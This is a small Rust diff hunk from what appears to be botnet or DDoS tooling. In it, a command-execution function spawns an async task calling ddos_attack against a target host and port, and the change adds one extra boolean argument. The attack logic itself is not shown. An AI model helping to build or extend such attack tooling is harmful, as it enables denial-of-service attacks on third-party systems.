@@ -50,7 +50,7 @@ pub async fn execute_command(cmd: String) -> Result<(), Box<dyn Error + Send + S
                 let at = attack_type.clone();
                 let t = target.clone();
                 tokio::spawn(async move {
-                    ddos_attack(at, t, port, duration).await;
+                    ddos_attack(at, t, port, duration, false).await;
                 });
             }
         }
